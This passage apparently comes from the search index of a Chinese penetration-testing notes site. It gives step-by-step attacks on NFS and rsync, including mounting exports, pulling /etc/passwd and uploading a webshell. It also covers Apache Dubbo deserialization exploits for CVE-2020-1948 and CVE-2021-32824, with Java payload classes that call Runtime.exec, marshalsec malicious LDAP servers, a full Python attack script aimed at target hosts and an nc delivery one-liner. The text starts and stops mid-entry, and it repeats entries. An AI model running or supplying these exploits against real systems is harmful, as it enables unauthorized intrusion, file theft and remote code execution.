192.168.1.172:/ /temp -o nolock","title":"NFS"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%9C%8D%E5%8A%A1%E7%B1%BB/NFS/NFS/#nfs","text":"","title":"NFS"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%9C%8D%E5%8A%A1%E7%B1%BB/NFS/NFS/#_1","text":"\u68c0\u6d4b \u68c0\u6d4b\u670d\u52a1\u662f\u5426\u5b58\u5728 msf showmount NFSSHELL \u5229\u7528 NFS\uff08Network File System\uff09\u5373\u7f51\u7edc\u6587\u4ef6\u7cfb\u7edf\uff0c\u662fFreeBSD\u652f\u6301\u7684\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u4e00\u79cd\uff0c\u5b83\u5141\u8bb8\u7f51\u7edc\u4e2d\u7684\u8ba1\u7b97\u673a\u4e4b\u95f4\u901a\u8fc7TCP/IP\u7f51\u7edc\u5171\u4eab\u8d44\u6e90\u3002\u5728NFS\u7684\u5e94\u7528\u4e2d\uff0c\u672c\u5730NFS\u7684\u5ba2\u6237\u7aef\u5e94\u7528\u53ef\u4ee5\u900f\u660e\u5730\u8bfb\u5199\u4f4d\u4e8e\u8fdc\u7aefNFS\u670d\u52a1\u5668\u4e0a\u7684\u6587\u4ef6\uff0c\u5c31\u50cf\u8bbf\u95ee\u672c\u5730\u6587\u4ef6\u4e00\u6837\u3002\u5982\u4ecaNFS\u5177\u5907\u4e86\u9632\u6b62\u88ab\u5229\u7528\u5bfc\u51fa\u6587\u4ef6\u5939\u7684\u529f\u80fd\uff0c\u4f46\u9057\u7559\u7cfb\u7edf\u4e2d\u7684NFS\u670d\u52a1\u914d\u7f6e\u4e0d\u5f53\uff0c\u5219\u4ecd\u53ef\u80fd\u906d\u5230\u6076\u610f\u653b\u51fb\u8005\u7684\u5229\u7528\u3002","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%9C%8D%E5%8A%A1%E7%B1%BB/NFS/NFS/#_2","text":"","title":"\u68c0\u6d4b"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%9C%8D%E5%8A%A1%E7%B1%BB/NFS/NFS/#_3","text":"\u9ed8\u8ba4\u7aef\u53e32049\uff0c\u6b64\u5916\u6211\u4eec\u4e5f\u53ef\u4ee5\u901a\u8fc7rpcinfo\u6765\u5224\u65ad\u76ee\u6807\u4e3b\u673a\u662f\u5426\u5f00\u542fNFS\u670d\u52a1\uff08\u4f7f\u7528rpcinfo\u9700\u8981\u76ee\u6807\u673a\u5668\u5f00\u542f111 rpcbind\u7aef\u53e3\uff09","title":"\u68c0\u6d4b\u670d\u52a1\u662f\u5426\u5b58\u5728"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%9C%8D%E5%8A%A1%E7%B1%BB/NFS/NFS/#msf","text":"auxiliary/scanner/nfs/nfsmount msf\u53ef\u4ee5\u6279\u91cf\u8dd1\u8fd8\u662f\u53ef\u4ee5\u3002 set rhosts file:/root/url.txt","title":"msf"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%9C%8D%E5%8A%A1%E7%B1%BB/NFS/NFS/#showmount","text":"showmount IP // \u8fde\u63a5\u7684\u4e3b\u673a showmount -d IP // \u76ee\u5f55 showmount -a IP // \u6302\u8f7d\u70b9","title":"showmount"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%9C%8D%E5%8A%A1%E7%B1%BB/NFS/NFS/#nfsshell","text":"\u63a8\u8350linux\u4e0b\u4f7f\u7528 https://github.com/NetDirect/nfsshell apt-get install libreadline-dev libncurses5-dev make gcc -g -o nfsshell mount_clnt.o mount_xdr.o nfs_prot_clnt.o nfs_prot_xdr.o nfsshell.o -L/usr/local/lib -lreadline -lhistory -lncurses ./nfsshell nfs> host IP // \u8fde\u63a5NFS\u670d\u52a1 nfs> export // \u5bfc\u51faNFS\u5217\u8868","title":"NFSSHELL"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%9C%8D%E5%8A%A1%E7%B1%BB/NFS/NFS/#_4","text":"\u5982\u679c\u6709\u5171\u4eab\u76ee\u5f55\uff0c\u5c31\u76f4\u63a5\u6302\u8f7d\u5230\u672c\u5730\u76ee\u5f55 mkdir /temp/ mount -t nfs 192.168.1.172:/ /temp -o nolock","title":"\u5229\u7528"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%9C%8D%E5%8A%A1%E7%B1%BB/RCSYNC/RCSYNC/","text":"RCSYNC \u76ee\u5f55 \u5229\u7528 \u624b\u52a8 msf Linux \u4e0b\u4e00\u6b3e\u6570\u636e\u5907\u4efd\u5de5\u5177,\u9ed8\u8ba4\u76d1\u542c 873 \u7aef\u53e3 \u5229\u7528 \u624b\u52a8 rsync rsync://your-ip:873/ rsync rsync://your-ip:873/src \u6765\u67e5\u770b\u6a21\u5757\u540d\u5217\u8868 \u6211\u4eec\u518d\u5217\u51fasrc\u6a21\u5757\u4e0b\u7684\u6587\u4ef6 rsync rsync://your-ip:873/src/ \u6211\u4eec\u53ef\u4ee5\u4e0b\u8f7d\u4efb\u610f\u6587\u4ef6\u6216\u76ee\u5f55\uff1a rsync -av rsync://your-ip:873/src/etc/passwd ./ rsync -avz rsync://ip:port/ /var/tmp \u4e0a\u4f20\u6587\u4ef6\u5230\u670d\u52a1\u5668\uff1a rsync -avz webshell.php ip::web/ msf \u53ef\u4ee5\u6279\u91cf msf > use auxiliary/scanner/rsync/modules_list msf auxiliary(modules_list) > show options ... show and set options ... msf auxiliary(modules_list) > set RHOSTS file:/root/url.txt msf auxiliary(modules_list) > exploit","title":"RCSYNC"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%9C%8D%E5%8A%A1%E7%B1%BB/RCSYNC/RCSYNC/#rcsync","text":"","title":"RCSYNC"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%9C%8D%E5%8A%A1%E7%B1%BB/RCSYNC/RCSYNC/#_1","text":"\u5229\u7528 \u624b\u52a8 msf Linux \u4e0b\u4e00\u6b3e\u6570\u636e\u5907\u4efd\u5de5\u5177,\u9ed8\u8ba4\u76d1\u542c 873 \u7aef\u53e3","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%9C%8D%E5%8A%A1%E7%B1%BB/RCSYNC/RCSYNC/#_2","text":"","title":"\u5229\u7528"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%9C%8D%E5%8A%A1%E7%B1%BB/RCSYNC/RCSYNC/#_3","text":"rsync rsync://your-ip:873/ rsync rsync://your-ip:873/src \u6765\u67e5\u770b\u6a21\u5757\u540d\u5217\u8868 \u6211\u4eec\u518d\u5217\u51fasrc\u6a21\u5757\u4e0b\u7684\u6587\u4ef6 rsync rsync://your-ip:873/src/ \u6211\u4eec\u53ef\u4ee5\u4e0b\u8f7d\u4efb\u610f\u6587\u4ef6\u6216\u76ee\u5f55\uff1a rsync -av rsync://your-ip:873/src/etc/passwd ./ rsync -avz rsync://ip:port/ /var/tmp \u4e0a\u4f20\u6587\u4ef6\u5230\u670d\u52a1\u5668\uff1a rsync -avz webshell.php ip::web/","title":"\u624b\u52a8"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%9C%8D%E5%8A%A1%E7%B1%BB/RCSYNC/RCSYNC/#msf","text":"\u53ef\u4ee5\u6279\u91cf msf > use auxiliary/scanner/rsync/modules_list msf auxiliary(modules_list) > show options ... show and set options ... msf auxiliary(modules_list) > set RHOSTS file:/root/url.txt msf auxiliary(modules_list) > exploit","title":"msf"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/%E6%A1%86%E6%9E%B6/","text":"\u6846\u67b6 thinkphp shiro Spring Boot struts tomcat swagger ECShop Dubbo","title":"\u6846\u67b6"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/%E6%A1%86%E6%9E%B6/#_1","text":"thinkphp shiro Spring Boot struts tomcat swagger ECShop Dubbo","title":"\u6846\u67b6"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/Dubbo/Dubbo/","text":"Dubbo \u76ee\u5f55 telnet nmap\u63a2\u6d4b\u7aef\u53e3 telnet \u672a\u6388\u6743\u8bbf\u95ee cve-2020-1948 Apache Dubbo Telnet handler \u4ee3\u7801\u6267\u884c\uff08CVE-2021-32824\uff09 \u963f\u91cc\u5df4\u5df4\u5f00\u6e90\u7684java RPC\u6846\u67b6\uff0c\u548cRMI\u662f\u4e00\u79cd\u7c7b\u578b\u7684\u6846\u67b6\u3002 telnet nmap\u63a2\u6d4b\u7aef\u53e3 \u8bb0\u5f97\u7528-sV\u53c2\u6570\uff0c\u624d\u4f1a\u63a2\u6d4b\u6307\u7eb9 Alibaba Dubbo remoting telnetd\u662fDubbo\u6846\u67b6\u4e2d\u7684\u4e00\u4e2a\u7ec4\u4ef6\uff0c\u5b83\u63d0\u4f9b\u4e86\u901a\u8fc7telnet\u547d\u4ee4\u8fdb\u884c\u670d\u52a1\u6cbb\u7406\u7684\u529f\u80fd\u3002\u4eceDubbo 2.0.5\u7248\u672c\u5f00\u59cb\uff0cDubbo\u5f00\u59cb\u652f\u6301\u901a\u8fc7telnet\u547d\u4ee4\u6765\u8fdb\u884c\u670d\u52a1\u6cbb\u7406\u3002 telnet \u672a\u6388\u6743\u8bbf\u95ee telnet ip host \u547d\u4ee4\u624b\u518c\uff1a https://cn.dubbo.apache.org/zh-cn/docs/references/telnet/ \u4f46\u5bb9\u6613\u9047\u5230\u88ab\u62e6\u3002 \u56e0\u4e3a\u9700\u8981\u6dfb\u52a0\u914d\u7f6e \u9700\u8981\u5728dubbo provider\u4e2d\u914d\u7f6e\uff1a dubbo.provider.telnet = ls,ps,cd,pwd,trace,count,invoke,select,status,log,help,clear,exit,shutdown ls,ps,cd,pwd,trace,count,invoke,select,status,log,help,clear,exit,shutdown \u4e3a\u9700\u8981\u542f\u7528\u7684telnet\u6307\u4ee4\uff0c\u6309\u9700\u6dfb\u52a0\u5373\u53ef cve-2020-1948 \u201c\u597d\u50cf\u4e0d\u7528\u77e5\u9053consumer\u7684\u540d\u79f0\u5c31\u80fd\u76f4\u63a5\u5f00\u6253\uff0c\u5177\u4f53\u662f\u600e\u6837\u8fd8\u5f97\u8c03\u4ee3\u7801\uff0c\u5495\u5495\u201c \u5982\u679c\u7cfb\u7edf\u5f00\u542f\u4e86dubbo\u7aef\u53e3\uff08\u59821.2.3.4:12345\uff09\uff0c\u653b\u51fb\u8005\u4f7f\u7528python\u6a21\u62dfdubbo\u901a\u4fe1\u534f\u8bae\u53d1\u9001rpc\u8bf7\u6c42\uff0c\u6570\u636e\u5305\u542b\u5e26\u6709\u65e0\u6cd5\u8bc6\u522b\u7684\u670d\u52a1\u540d\u79f0service_nam\u6216\u65b9\u6cd5\u540d\u79f0method_name\uff0c\u53ca\u6076\u610f\u53c2\u6570\uff08JdbcRowSetImpl\u7b49\uff09\uff0c\u5728\u53cd\u5e8f\u5217\u5316\u8fd9\u4e9b\u6076\u610f\u53c2\u6570\u65f6\u4fbf\u4f1a\u89e6\u53d1JNDI\u6ce8\u5165\uff0c\u5bfc\u81f4\u6267\u884c\u4efb\u610f\u6076\u610f\u4ee3\u7801\u3002 \u56e0\u6b64\u653b\u51fb\u96be\u5ea6\u8f83\u4f4e\uff0c\u4f46\u653b\u51fb\u5371\u5bb3\u5f88\u5927\u3002 Versions Affected: Dubbo 2.7.0 to 2.7.6 Dubbo 2.6.0 to 2.6.7 Dubbo all 2.5.x versions (not supported by official team any longer) 1.\u7f16\u5199exp.java\uff0c\u7528dnslog\u68c0\u6d4b import javax.naming.Context; import javax.naming.Name; import javax.naming.spi.ObjectFactory; import java.util.Hashtable; public class exp { public exp(){ try { java.lang.Runtime.getRuntime().exec(\"ping tt.d3f051053d.ipv6.1433.eu.org\"); } catch (java.io.IOException e) { e.printStackTrace(); } } } 2.\u7f16\u8bd1java\uff0c\u5f97\u5230exp.class javac exp.java 3.\u4e0b\u8f7dmarshalsec\u5e76\u7f16\u8bd1\u6210jar\uff0c https://github.com/mbechler/marshalsec 4.\u7528python\u8d77\u4e00\u4e2ahttp\u670d\u52a1\uff0c\u5e76\u628aexp.class\u653e\u5230http\u76ee\u5f55\u4e0b python -m SimpleHTTPServer 80 5.\u7528marshalsec\u5f00\u542fldap java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.31.153/#exp 777 6.python\u5b89\u88c5dubbo\u5e93 pip3 install dubbo-py 7.\u653b\u51fb\u811a\u672c # -*- coding: utf-8 -*- import sys from dubbo.codec.hessian2 import Decoder,new_object from dubbo.client import DubboClient if len(sys.argv) < 4: print('Usage: python {} DUBBO_HOST DUBBO_PORT LDAP_URL'.format(sys.argv[0])) print('\\nExample:\\n\\n- python {} 1.1.1.1 12345 ldap://1.1.1.6:80/exp'.format(sys.argv[0])) sys.exit() client = DubboClient(sys.argv[1], int(sys.argv[2])) JdbcRowSetImpl=new_object( 'com.sun.rowset.JdbcRowSetImpl', dataSource=sys.argv[3], strMatchColumns=[\"foo\"] ) JdbcRowSetImplClass=new_object( 'java.lang.Class', name=\"com.sun.rowset.JdbcRowSetImpl\", ) toStringBean=new_object( 'com.rometools.rome.feed.impl.ToStringBean', beanClass=JdbcRowSetImplClass, obj=JdbcRowSetImpl ) resp = client.send_request_and_return_response( service_name='org.apache.dubbo.spring.boot.sample.consumer.DemoService', # \u6b64\u5904\u53ef\u4ee5\u662f $invoke\u3001$invokeSync\u3001$echo \u7b49\uff0c\u901a\u6740 2.7.7 \u53ca CVE \u516c\u5e03\u7684\u6240\u6709\u7248\u672c\u3002 method_name='$invoke', args=[toStringBean]) output = str(resp) if 'Fail to decode request due to: RpcInvocation' in output: print('[!] Target maybe not support deserialization.') elif 'EXCEPTION: Could not complete class com.sun.rowset.JdbcRowSetImpl.toString()' in output: print('[+] Succeed.') else: print('[!] Output:') print(output) print('[!] Target maybe not use dubbo-remoting library.') python3 Dubbo.py 192.168.137.173 12345 ldap://139.9.198.30:777/calc Apache Dubbo Telnet handler \u4ee3\u7801\u6267\u884c\uff08CVE-2021-32824\uff09 \"\u524d\u63d0\uff0ctelnet\u80fd\u6267\u884c\u547d\u4ee4\uff0c\u4e14\u8981\u77e5\u9053dubbo \u7684\u4e00\u4e2aprovider\u7c7b\u4ee5\u53ca\u5176\u65b9\u6cd5\u548c\u53c2\u6570\u4e2a\u6570\uff0c\u5982\u4e0b\u4f8b\u5b50\u4fbf\u662f\u8c03\u7528\u4e86\u4e00\u4e2a\u4e09\u53c2\u6570\u7684\u65b9\u6cd5\u201c telnet\u8fde\u4e0a\uff0c\u80fd\u6267\u884c\u547d\u4ee4\u76f4\u63a5\u5e72 invoke [provider_interface].[method_name]({'class':'org.apache.xbean.propertyeditor.JndiConverter','asText':'ldap://{dns_log}/#FoolBoy'},'test','test'}) \u5177\u4f53\u64cd\u4f5c 1.Exploit.java\uff0c\u7f16\u8bd1\uff0c\u5e76\u628aclass\u653e\u5230http\u670d\u52a1\u76ee\u5f55 public class Exploit { public Exploit(){ try{ Runtime.getRuntime().exec(\"/bin/bash -c /System/Applications/Calculator.app/Contents/MacOS/Calculator\"); }catch(Exception e){ e.printStackTrace(); } } public static void main(String[] argv){ Exploit e = new Exploit(); } } javac Exploit.java python3 -m http.server 8080 2.marshalsec\u8d77\u4e00\u4e2a\u6076\u610fldap \u670d\u52a1\u5668 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://127.0.0.1:8080/#Exploit\" 3\u8fde\u4e0atelnet\u76f4\u63a5\u5f00\u5e72 echo \"invoke org.apache.dubbo.samples.basic.api.DemoService.sayHello({'class':'org.apache.xbean.propertyeditor.JndiConverter','asText': 'ldap://127.0.0.1:1389/Exploit'})\" | nc -i 1 127.0.0.1 20880","title":"Dubbo"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/Dubbo/Dubbo/#dubbo","text":"","title":"Dubbo"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/Dubbo/Dubbo/#_1","text":"telnet nmap\u63a2\u6d4b\u7aef\u53e3 telnet \u672a\u6388\u6743\u8bbf\u95ee cve-2020-1948 Apache Dubbo Telnet handler \u4ee3\u7801\u6267\u884c\uff08CVE-2021-32824\uff09 \u963f\u91cc\u5df4\u5df4\u5f00\u6e90\u7684java RPC\u6846\u67b6\uff0c\u548cRMI\u662f\u4e00\u79cd\u7c7b\u578b\u7684\u6846\u67b6\u3002","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/Dubbo/Dubbo/#telnet","text":"","title":"telnet"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/Dubbo/Dubbo/#nmap","text":"\u8bb0\u5f97\u7528-sV\u53c2\u6570\uff0c\u624d\u4f1a\u63a2\u6d4b\u6307\u7eb9 Alibaba Dubbo remoting telnetd\u662fDubbo\u6846\u67b6\u4e2d\u7684\u4e00\u4e2a\u7ec4\u4ef6\uff0c\u5b83\u63d0\u4f9b\u4e86\u901a\u8fc7telnet\u547d\u4ee4\u8fdb\u884c\u670d\u52a1\u6cbb\u7406\u7684\u529f\u80fd\u3002\u4eceDubbo 2.0.5\u7248\u672c\u5f00\u59cb\uff0cDubbo\u5f00\u59cb\u652f\u6301\u901a\u8fc7telnet\u547d\u4ee4\u6765\u8fdb\u884c\u670d\u52a1\u6cbb\u7406\u3002","title":"nmap\u63a2\u6d4b\u7aef\u53e3"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/Dubbo/Dubbo/#telnet_1","text":"telnet ip host \u547d\u4ee4\u624b\u518c\uff1a https://cn.dubbo.apache.org/zh-cn/docs/references/telnet/ \u4f46\u5bb9\u6613\u9047\u5230\u88ab\u62e6\u3002 \u56e0\u4e3a\u9700\u8981\u6dfb\u52a0\u914d\u7f6e \u9700\u8981\u5728dubbo provider\u4e2d\u914d\u7f6e\uff1a dubbo.provider.telnet = ls,ps,cd,pwd,trace,count,invoke,select,status,log,help,clear,exit,shutdown ls,ps,cd,pwd,trace,count,invoke,select,status,log,help,clear,exit,shutdown \u4e3a\u9700\u8981\u542f\u7528\u7684telnet\u6307\u4ee4\uff0c\u6309\u9700\u6dfb\u52a0\u5373\u53ef","title":"telnet \u672a\u6388\u6743\u8bbf\u95ee"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/Dubbo/Dubbo/#cve-2020-1948","text":"\u201c\u597d\u50cf\u4e0d\u7528\u77e5\u9053consumer\u7684\u540d\u79f0\u5c31\u80fd\u76f4\u63a5\u5f00\u6253\uff0c\u5177\u4f53\u662f\u600e\u6837\u8fd8\u5f97\u8c03\u4ee3\u7801\uff0c\u5495\u5495\u201c \u5982\u679c\u7cfb\u7edf\u5f00\u542f\u4e86dubbo\u7aef\u53e3\uff08\u59821.2.3.4:12345\uff09\uff0c\u653b\u51fb\u8005\u4f7f\u7528python\u6a21\u62dfdubbo\u901a\u4fe1\u534f\u8bae\u53d1\u9001rpc\u8bf7\u6c42\uff0c\u6570\u636e\u5305\u542b\u5e26\u6709\u65e0\u6cd5\u8bc6\u522b\u7684\u670d\u52a1\u540d\u79f0service_nam\u6216\u65b9\u6cd5\u540d\u79f0method_name\uff0c\u53ca\u6076\u610f\u53c2\u6570\uff08JdbcRowSetImpl\u7b49\uff09\uff0c\u5728\u53cd\u5e8f\u5217\u5316\u8fd9\u4e9b\u6076\u610f\u53c2\u6570\u65f6\u4fbf\u4f1a\u89e6\u53d1JNDI\u6ce8\u5165\uff0c\u5bfc\u81f4\u6267\u884c\u4efb\u610f\u6076\u610f\u4ee3\u7801\u3002 \u56e0\u6b64\u653b\u51fb\u96be\u5ea6\u8f83\u4f4e\uff0c\u4f46\u653b\u51fb\u5371\u5bb3\u5f88\u5927\u3002 Versions Affected: Dubbo 2.7.0 to 2.7.6 Dubbo 2.6.0 to 2.6.7 Dubbo all 2.5.x versions (not supported by official team any longer) 1.\u7f16\u5199exp.java\uff0c\u7528dnslog\u68c0\u6d4b import javax.naming.Context; import javax.naming.Name; import javax.naming.spi.ObjectFactory; import java.util.Hashtable; public class exp { public exp(){ try { java.lang.Runtime.getRuntime().exec(\"ping tt.d3f051053d.ipv6.1433.eu.org\"); } catch (java.io.IOException e) { e.printStackTrace(); } } } 2.\u7f16\u8bd1java\uff0c\u5f97\u5230exp.class javac exp.java 3.\u4e0b\u8f7dmarshalsec\u5e76\u7f16\u8bd1\u6210jar\uff0c https://github.com/mbechler/marshalsec 4.\u7528python\u8d77\u4e00\u4e2ahttp\u670d\u52a1\uff0c\u5e76\u628aexp.class\u653e\u5230http\u76ee\u5f55\u4e0b python -m SimpleHTTPServer 80 5.\u7528marshalsec\u5f00\u542fldap java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.31.153/#exp 777 6.python\u5b89\u88c5dubbo\u5e93 pip3 install dubbo-py 7.\u653b\u51fb\u811a\u672c # -*- coding: utf-8 -*- import sys from dubbo.codec.hessian2 import Decoder,new_object from dubbo.client import DubboClient if len(sys.argv) < 4: print('Usage: python {} DUBBO_HOST DUBBO_PORT LDAP_URL'.format(sys.argv[0])) print('\\nExample:\\n\\n- python {} 1.1.1.1 12345 ldap://1.1.1.6:80/exp'.format(sys.argv[0])) sys.exit() client = DubboClient(sys.argv[1], int(sys.argv[2])) JdbcRowSetImpl=new_object( 'com.sun.rowset.JdbcRowSetImpl', dataSource=sys.argv[3], strMatchColumns=[\"foo\"] ) JdbcRowSetImplClass=new_object( 'java.lang.Class', name=\"com.sun.rowset.JdbcRowSetImpl\", ) toStringBean=new_object( 'com.rometools.rome.feed.impl.ToStringBean', beanClass=JdbcRowSetImplClass, obj=JdbcRowSetImpl ) resp = client.send_request_and_return_response( service_name='org.apache.dubbo.spring.boot.sample.consumer.DemoService', # \u6b64\u5904\u53ef\u4ee5\u662f $invoke\u3001$invokeSync\u3001$echo \u7b49\uff0c\u901a\u6740 2.7.7 \u53ca CVE \u516c\u5e03\u7684\u6240\u6709\u7248\u672c\u3002 method_name='$invoke', args=[toStringBean]) output = str(resp) if 'Fail to decode request due to: RpcInvocation' in output: print('[!] Target maybe not support deserialization.') elif 'EXCEPTION: Could not complete class com.sun.rowset.JdbcRowSetImpl.toString()' in output: print('[+] Succeed.') else: print('[!] Output:') print(output) print('[!] Target maybe not use dubbo-remoting library.') python3 Dubbo.py 192.168.137.173 12345 ldap://139.9.198.30:777/calc","title":"cve-2020-1948"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/Dubbo/Dubbo/#apache-dubbo-telnet-handler-cve-2021-32824","text":"\"\u524d\u63d0\uff0ctelnet\u80fd\u6267\u884c\u547d\u4ee4\uff0c\u4e14\u8981\u77e5\u9053dubbo \u7684\u4e00\u4e2aprovider\u7c7b\u4ee5\u53ca\u5176\u65b9\u6cd5\u548c\u53c2\u6570\u4e2a\u6570\uff0c\u5982\u4e0b\u4f8b\u5b50\u4fbf\u662f\u8c03\u7528\u4e86\u4e00\u4e2a\u4e09\u53c2\u6570\u7684\u65b9\u6cd5\u201c telnet\u8fde\u4e0a\uff0c\u80fd\u6267\u884c\u547d\u4ee4\u76f4\u63a5\u5e72 invoke [provider_interface].[method_name]({'class':'org.apache.xbean.propertyeditor.JndiConverter','asText':'ldap://{dns_log}/#FoolBoy'},'test','test'}) \u5177\u4f53\u64cd\u4f5c 1.Exploit.java\uff0c\u7f16\u8bd1\uff0c\u5e76\u628aclass\u653e\u5230http\u670d\u52a1\u76ee\u5f55 public class Exploit { public Exploit(){ try{ Runtime.getRuntime().exec(\"/bin/bash -c /System/Applications/Calculator.app/Contents/MacOS/Calculator\"); }catch(Exception e){ e.printStackTrace(); } } public static void main(String[] argv){ Exploit e = new Exploit(); } } javac Exploit.java python3 -m http.server 8080 2.marshalsec\u8d77\u4e00\u4e2a\u6076\u610fldap \u670d\u52a1\u5668 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://127.0.0.1:8080/#Exploit\" 3\u8fde\u4e0atelnet\u76f4\u63a5\u5f00\u5e72 echo \"invoke org.apache.dubbo.samples.basic.api.DemoService.sayHello({'class':'org.apache.xbean.propertyeditor.JndiConverter','asText': 'ldap://127.0.0.1:1389/Exploit'})\" | nc -i 1 127.0.0.1 20880","title":"Apache Dubbo Telnet handler \u4ee3\u7801\u6267\u884c\uff08CVE-2021-32824\uff09"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/ECShop/ECShop/","text":"ECShop ECShop\u662f\u4e00\u6b3e\u5f00\u6e90\u7684\u7535\u5b50\u5546\u52a1\u7cfb\u7edf \u4fe1\u606f\u641c\u96c6 \u7248\u672c\u63a2\u6d4b f12\u641c\u7d22ecshop","title":"ECShop"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/ECShop/ECShop/#ecshop","text":"ECShop\u662f\u4e00\u6b3e\u5f00\u6e90\u7684\u7535\u5b50\u5546\u52a1\u7cfb\u7edf","title":"ECShop"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/ECShop/ECShop/#_1","text":"","title":"\u4fe1\u606f\u641c\u96c6"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/ECShop/ECShop/#_2","text":"f12\u641c\u7d22ecshop","title":"\u7248\u672c\u63a2\u6d4b"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/Spring%20Boot/Spring%20Boot/","text":"Spring Boot Spring Boot Actuator Spring boot","title":"Spring Boot"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/Spring%20Boot/Spring%20Boot/#spring-boot","text":"Spring Boot Actuator Spring boot","title":"Spring Boot"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%A1%86%E6%9E%B6/Spring%20Boot/Spring%20Boot%20Actuator/Spring%20Boot%20Actuator/","text":"Spring Boot Actuator \u76ee\u5f55 \u7aef\u70b9 \u8be6\u7ec6\u4e00\u70b9\u7684\u653b\u51fb\u624b\u6cd5 /env \u661f\u53f7\u53bb\u9664 \u62fc\u5199\u9519\u8bef \u5229\u7528/heapdump \u5229\u7528spring.cloud.bootstrap.location \u5229\u7528eureka.client.serviceUrl.defaultZone \u5229\u7528jolokia\u7684mbean RCE\u6f0f\u6d1e spring cloud snakeyml REF: \u6279\u91cf\u626b\u63cf\uff1a https://github.com/AabyssZG/SpringBoot-Scan.git Actuator\u662fspring boot\u7684\u4e00\u4e2a\u76d1\u63a7\u6a21\u5757\uff0c\u5b83\u5b9a\u4e49\u4e86\u5f88\u591aendpoint\uff08\u7aef\u70b9\uff0c\u4e5f\u5c31\u662f\u4e00\u4e9b\u7279\u5b9a\u7684\u8def\u7531\uff09\u7528\u6765\u663e\u793a\u7edf\u8ba1\u6570\u636e\uff0c\u76d1\u63a7\u4fe1\u606f\u7b49\u3002 \u672c\u610f\u662f\u5e2e\u52a9\u5f00\u53d1\u4eba\u5458\u5bf9Spring\u670d\u52a1\u8fdb\u884c\u76d1\u63a7\u4ece\u800c\u8fdb\u884c\u7ef4\u62a4\u7b49\u64cd\u4f5c\uff0c\u4f46\u7531\u4e8eActuator\u53ef\u80fd\u5b58\u5728\u672a\u6388\u6743\u95ee\u9898\uff0c\u5bfc\u81f4\u8fd9\u4e9b\u654f\u611f\u4fe1\u606f\u4f1a\u66b4\u9732\u7ed9\u653b\u51fb\u8005\uff0c\u4ece\u800c\u9020\u6210\u6f5c\u5728\u7684\u653b\u51fb\u3002 \u7aef\u70b9 Spring 